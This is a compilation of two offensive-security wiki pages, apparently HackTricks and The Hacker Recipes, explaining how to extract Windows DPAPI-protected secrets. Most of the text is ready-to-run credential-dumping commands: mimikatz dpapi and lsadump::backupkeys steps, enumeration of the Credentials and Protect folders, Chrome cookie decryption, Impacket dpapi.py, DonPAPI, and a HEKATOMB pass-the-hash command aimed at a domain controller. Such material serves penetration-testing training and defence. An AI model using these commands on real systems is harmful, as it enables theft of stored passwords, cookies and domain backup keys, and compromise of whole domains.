# DPAPI - Extracting Passwords

##
#
https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.md
#
https://github.com/ShutdownRepo/The-Hacker-Recipes/blob/master/ad/movement/credentials/dumping/dpapi-protected-secrets.md
#
##

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}


## What is DPAPI

The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.

### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more


## List Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Credential Files

The **credentials files protected** could be located in:

```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Get credentials info using mimikatz `dpapi::cred`, in the response you can find interesting info such as the encrypted data and the guidMasterKey.

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:

```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```

## Master Keys

The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [**Security Identifier**](https://en.wikipedia.org/wiki/Security\_Identifier) **of that user**. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS).

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This is what a bunch of Master Keys of a user will looks like:

![](<../../.gitbook/assets/image (324).png>)

Usually **each master keys is an encrypted symmetric key that can decrypt other content**. Therefore, **extracting** the **encrypted Master Key** is interesting in order to **decrypt** later that **other content** encrypted with it.

### Extract master key & decrypt

Check the post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) for an example of how to extract the master key and decrypt it.


## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) is a C# port of some DPAPI functionality from [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) project.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is a tool that automates the extraction of all users and computers from the LDAP directory and the extraction of domain controller backup key through RPC. The script will then resolve all computers ip address and perform a smbclient on all computers to retrieve all DPAPI blobs of all users and decrypt everything with domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

With extracted from LDAP computers list you can find every sub network even if you didn't know them !

"Because Domain Admin rights are not enough. Hack them all."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) can dump secrets protected by DPAPI automatically.

## References

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) is the most relevant cybersecurity event in **Spain** and one of the most important in **Europe**. With **the mission of promoting technical knowledge**, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

##
##

---
description: MITRE ATT&CK™ Sub-technique T1555.003
---

# DPAPI secrets

## Theory

The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:

```bash
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.

Below are common paths of hidden files that usually contain DPAPI-protected data.

```bash
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, DPAPI-data can be manipulated (mainly offline) with tools like [dpapick](https://github.com/jordanbtucker/dpapick) (Python), [dpapilab](https://github.com/dfirfpi/dpapilab) (Python), [Impacket](https://github.com/SecureAuthCorp/impacket)'s [dpapi.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py) and [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python).

```bash
# (not tested) Decrypt a master key
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

# (not tested) Obtain the backup keys & use it to decrypt a master key
dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"

# (not tested) Decrypt DPAPI-protected data using a master key
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
```

[DonPAPI](https://github.com/login-securite/DonPAPI) (Python) can also be used to remotely extract a user's DPAPI secrets more easily. It supports [pass-the-hash](broken-reference), [pass-the-ticket](broken-reference) and so on.

```bash
DonPAPI.py 'domain'/'username':'password'@<'targetName' or 'address/mask'>
```
{% endtab %}

{% tab title="Windows" %}
On Windows systems [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used to extract dpapi with [`lsadump::backupkeys`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/backupkeys), decrypt with [`dpapi::chrome`](https://tools.thehacker.recipes/mimikatz/modules/dpapi/chrome) and [`dpapi::cred`](https://tools.thehacker.recipes/mimikatz/modules/dpapi/cred) or use specific master keys with [`dpapi::masterkey`](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey) and [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi) , using specified passwords or given sufficient privileges.

```bash
# Extract and decrypt a master key
dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /sid:$SID /password:$PASSWORD /protected

# Extract and decrypt all master keys
sekurlsa::dpapi

# Extract the backup keys & use it to decrypt a master key
lsadump::backupkeys /system:$DOMAIN_CONTROLLER /export
dpapi::masterkey /in:"C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID" /pvk:$BACKUP_KEY_EXPORT_PVK

# Decrypt Chrome data
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"

# Decrypt DPAPI-protected data using a master key
dpapi::cred /in:"C:\path\to\encrypted\file" /masterkey:$MASTERKEY
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords" %}

{% embed url="https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf" %}
